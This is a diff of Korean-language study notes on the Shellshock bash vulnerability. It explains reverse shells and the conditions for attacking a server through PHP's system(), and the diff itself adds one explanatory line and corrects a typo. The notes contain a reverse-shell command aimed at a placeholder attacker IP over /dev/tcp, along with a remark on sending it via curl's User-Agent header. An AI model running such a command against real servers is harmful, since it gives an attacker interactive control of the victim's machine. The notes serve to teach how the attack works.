@@ -67,11 +67,13 @@ foo='() { echo "test"; } -> foo () { echo "test"; }
 * 이후 서버쪽에서 ```$ /bin/bash -i > /dev/tcp/<attacker ip>/9090 0<&1 2>&1```을 실행시켜준다.
 * bash를 interactive하게 쓴다는 거고 거기의 stdout을 9090포트로 보내는데 stdout내용을 fd 0(stdin) 으로 사용하고 stderr는 stdout(fd 1)로 보내겠다는 의미이다.
 * 서버에 보내는 명령어를 이전에 배운 shellshock를 통해 실행시키면 되는데 curl -A에 넣어서 보내면 된다.
+* Reverse shell에서 중요한 것은 standard input, output, and error에 관한 값을 공격자의 network connection으로 redirect하는 것이다. 
+
 
 ## Remote Attack on PHP
 
 * Shellshock 공격에는 다음 2가지 조건이 필요하다.
-    1. invocation ofo bash
+    1. invocation of bash
     1. passing of user data as environment variables
 * PHP code에서 system()을 쓰고, shell 이 bash라면 1번 조건이 충족된다.
 * system()을 통해서 environment variables을 user input에 의해 설정할 수 있다면 2번 조건이 충족된다.
